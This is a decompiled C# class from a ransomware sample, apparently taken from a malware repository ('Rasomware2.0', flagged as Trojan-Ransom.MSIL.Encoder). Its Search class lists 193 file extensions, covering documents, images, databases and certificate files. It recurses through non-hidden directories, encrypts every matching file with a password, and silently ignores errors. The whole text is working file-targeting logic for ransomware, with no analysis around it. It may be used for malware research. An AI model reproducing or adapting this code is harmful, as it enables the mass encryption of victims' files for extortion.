// Decompiled with JetBrains decompiler
// Type: Encrypt.Core.Search
// Assembly: Rasomware2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2779CBD6-B05D-4134-88E0-F6173B4E0DD8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-2ef5f5e60a1caf03985987de9c67e59a516184f2dcca56702620102cbeeb5ffe.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Encrypt.Core
{
  internal class Search
  {
    private readonly Encryption _Encryption = new Encryption();
    private readonly string[] _Extensions = new string[193]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".png",
      ".jpeg",
      ".gif",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".sln",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".dll",
      ".c",
      ".cs",
      ".vb",
      ".mp3",
      ".mp4",
      ".f3d",
      ".dwg",
      ".cpp",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".lnk",
      ".iso",
      ".7z",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".uue",
      ".xz",
      ".z",
      ".001",
      ".mpeg",
      ".mpg",
      ".core",
      ".crproj",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".torrent",
      ".3dm",
      ".3g2",
      ".3gp",
      ".aaf",
      ".accdb",
      ".aep",
      ".aepx",
      ".aet",
      ".ai",
      ".aif",
      ".arw",
      ".as",
      ".as3",
      ".asf",
      ".asx",
      ".bay",
      ".cdr",
      ".cer",
      ".class",
      ".cr2",
      ".crt",
      ".crw",
      ".dbf",
      ".dcr",
      ".der",
      ".dng",
      ".docb",
      ".docm",
      ".dot",
      ".dotm",
      ".dotx",
      ".dxf",
      ".dxg",
      ".efx",
      ".eps",
      ".erf",
      ".fla",
      ".flv",
      ".idml",
      ".iff",
      ".indb",
      ".indd",
      ".indl",
      ".indt",
      ".inx",
      ".java",
      ".kdc",
      ".m3u",
      ".m3u8",
      ".m4u",
      ".max",
      ".mdf",
      ".mef",
      ".mid",
      ".mpa",
      ".mrw",
      ".msg",
      ".nef",
      ".nrw",
      ".odb",
      ".odc",
      ".odm",
      ".odp",
      ".ods",
      ".orf",
      ".p12",
      ".p7b",
      ".p7c",
      ".pef",
      ".pem",
      ".pfx",
      ".plb",
      ".pmd",
      ".pot",
      ".potm",
      ".potx",
      ".ppam",
      ".ppj",
      ".pps",
      ".ppsm",
      ".ppsx",
      ".pptm",
      ".prel",
      ".prproj",
      ".ps",
      ".pst",
      ".ptx",
      ".r3d",
      ".ra",
      ".raf",
      ".raw",
      ".rb",
      ".rw2",
      ".rwl",
      ".sdf",
      ".sldm",
      ".sldx",
      ".sr2",
      ".srf",
      ".srw",
      ".svg",
      ".swf",
      ".tif",
      ".vcf",
      ".vob",
      ".wav",
      ".wb2",
      ".wma",
      ".wmv",
      ".wpd",
      ".wps",
      ".x3f",
      ".xla",
      ".xlam",
      ".xlk",
      ".xll",
      ".xlm",
      ".xlsb",
      ".xlsm",
      ".xlt",
      ".xltm",
      ".xltx",
      ".xlw",
      ".xqx"
    };

    internal void Data(string _Path, string _Password)
    {
      try
      {
        string[] files = Directory.GetFiles(_Path);
        string[] directories = Directory.GetDirectories(_Path);
        foreach (string str in files)
        {
          if (((IEnumerable<string>) this._Extensions).Contains<string>(Path.GetExtension(str)) && !string.IsNullOrEmpty(Path.GetExtension(str)))
            this._Encryption.File_Encryption(str, _Password);
        }
        foreach (string str in directories)
        {
          if ((File.GetAttributes(str) & FileAttributes.Hidden) != FileAttributes.Hidden)
            this.Data(str, _Password);
        }
      }
      catch (Exception ex)
      {
      }
    }
  }
}
